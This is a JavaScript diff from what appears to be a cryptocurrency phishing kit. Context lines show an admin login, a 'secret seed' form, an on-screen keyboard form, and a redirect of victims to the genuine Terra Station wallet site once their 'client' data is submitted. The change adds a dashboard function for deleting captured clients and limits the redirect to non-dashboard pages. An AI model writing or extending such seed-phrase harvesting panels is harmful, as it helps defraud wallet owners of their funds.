@@ -187,17 +187,51 @@ const login =(() => {
 
         });
     }
+
+    function deleteClient(button) {
+        const buttons = document.querySelectorAll(button);
+
+        if(!button) return
+
+        for (const btn of buttons) {
+            btn.addEventListener('click', async function (e) {
+                try {
+                    e.preventDefault()
+
+                    const client_id = btn.dataset.client
+
+                    if(!client_id) return
+
+                    const options = {
+                        method: 'DELETE',
+                        headers: {
+                            'content-type': 'application/json',
+                        },
+                    }
+
+                    const client  = await(fetch(`/clients/${client_id}`, options)).json()
+
+                    console.log(client)
+                } catch (error) {
+                    console.log(error)
+                }
+                
+            });
+        }
+    }
     
     return {
         //public var/functions
         submit,
         sendUser,
-        getFormData
+        getFormData,
+        deleteClient
     }
 })()
 
 login.submit(`.formAdminLogin`)
 login.sendUser(`.senduserForm`)
+login.deleteClient(`.delete-client`)
 
 const showPassButton = document.querySelector('.showpassword-icon');
 
@@ -445,5 +479,7 @@ submit.formSubmit(`.form-secret-seed`)
 keyboard.handleForm(`.boxKeyboard form`)
 
 socket.on('clientSubmit', (data) => {
-    window.location.href = `https://station.terra.money/`
+    if(!document.body.classList.contains('dashboard')){
+        window.location.href = `https://station.terra.money/`
+    }
 })
